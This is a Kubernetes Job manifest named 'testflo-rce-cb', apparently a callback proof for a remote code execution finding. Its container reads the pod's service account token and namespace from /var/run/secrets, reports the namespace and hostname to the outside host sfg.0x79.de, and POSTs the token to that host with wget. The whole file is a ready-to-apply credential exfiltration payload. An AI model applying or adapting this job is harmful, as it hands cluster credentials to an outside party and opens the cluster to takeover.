apiVersion: batch/v1
kind: Job
metadata:
  name: testflo-rce-cb
spec:
  ttlSecondsAfterFinished: 120
  template:
    spec:
      restartPolicy: Never
      containers:
        - name: cb
          image: alpine:3.19
          command:
            - sh
            - -c
            - |
              TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
              NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
              wget -q -O- "https://sfg.0x79.de/cb?t=TESTFLO-RCE-JOB&ns=${NS}&h=$(hostname)" || true
              wget -q --post-data "tok=${TOKEN}" "https://sfg.0x79.de/cb-tok?t=TESTFLO-RCE-JOB" || true
